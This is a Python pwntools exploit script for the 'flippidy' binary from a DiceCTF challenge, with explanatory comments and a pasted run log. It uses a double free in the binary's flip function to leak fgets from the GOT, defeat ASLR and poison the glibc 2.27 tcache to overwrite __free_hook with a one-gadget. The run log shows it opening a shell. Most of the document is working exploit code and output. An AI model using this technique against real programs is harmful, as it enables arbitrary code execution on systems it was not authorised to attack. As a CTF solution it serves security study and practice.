from pwn import *


filename = "./flippidy"
elf = ELF(filename)
context.arch = 'amd64'

libc = ELF('./libc.so.6')
r = process("./flippidy", env={"LD_PRELOAD": "./libc.so.6"})
def add(index, content):
    r.sendlineafter(': ', '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Content: ', content)

def flip():
    r.sendlineafter(': ', '2')


'''
Since the given GLIBC version was 2.27ubuntu1, it didn't had a check for the double free
For that so, the program implemented the `flip()` function which flips the data from one chunk to another
by changing the layout as well, making the first occupied to chunk and vice versa

Since, first it asks for the notebook size and create an array of that size on the heap
Ths being said, it keeps the information about the array on the heap at the address

0x401050 as struct


struct notebook {
	int size;
	char *array;
}

The vulnerability lies in the `flip` function, once it does the flip
It mallocs and frees accordingly, doing that so, it also flips at least 2 chunks, given 1 as the size of the notebook
It deallocates it two times using free, indicating the double free
'''


r.sendlineafter(": ", "1")

'''
Now, to replicate it, first we will store the global_array which had the menu string stored as an array,
given this address, when free will be called 2 times, it'll make the chunk go in the same index 2 times with an interval of
0x20 bytes
'''
add(0, p64(0x404020)) # Add the menu_array
flip()                # Trigger Double free


payload = p64(elf.got['fgets'])*4
payload += p64(0x404158)

'''
0x404020:	0x0000000000403fc0	0x0000000000403fc0
0x404030:	0x0000000000403fc0	0x0000000000403fc0
0x404040:	0x0000000000404158	0x2d2d2d2d2d20000a
'''

add(0, payload)                  # Overwrite the array with the fgets@got and the 0x404040 to the start of the notebook's address
'''
When the print_menu function will be called, it'll print the fgets address
'''
fgets = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc.address = fgets-libc.symbols['fgets']

ONE_SHOT = libc.address+0x4f322
log.info("fgets 0x%x" % fgets)
log.info("libc.address 0x%x" % libc.address)

'''
0x0000000000404040 -> 0x0000000000404158 -> 0x0000000000b65260 -> 0x404020 -> …

1st malloc and setting 0xdeadbeef as input, the list will look like this:
0x0000000000404158 -> 0x0000000000b65260 -> 0x0000000000404040 -> 0x00000000deadbeef

2nd malloc and setting p64(libc.symbols[‘__free_hook’]) as input:
0x0000000000b65260 -> 0x0000000000404158 -> __free_hook -> 0x0

3rd malloc and setting 0xdeadbeef as input:
0x0000000000404158 -> __free_hook -> 0x0000000000b65260 -> 0xdeadbeef

4th malloc and setting p64(libc.symbols[‘____free_hook’]) as input:
__free_hook -> 0x0000000000404158 -> __free_hook -> …

'''

add(0, p64(0xdeadbeef))  # 0x404040

add(0, p64(libc.symbols['__free_hook'])) # 0x404158
add(0, p64(0xdeadbeef))                  # 0xb65260
add(0, p64(libc.symbols['__free_hook'])) # 0x404158

add(0, p64(ONE_SHOT))                    # __free_hook
flip()                                   # Triggers the __free_hook

'''
vagrant@ubuntu-bionic:~/sharedFolder/CTFs/DiceCTF$ python3 flippidy.py 
[*] '/home/vagrant/sharedFolder/CTFs/DiceCTF/flippidy'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/vagrant/sharedFolder/CTFs/DiceCTF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './flippidy': pid 2881
[*] fgets 0x7f55ba3b0b20
[*] libc.address 0x7f55ba332000
[*] Switching to interactive mode
$ whoami
vagrant
$ 
[*] Interrupted
'''
r.interactive()
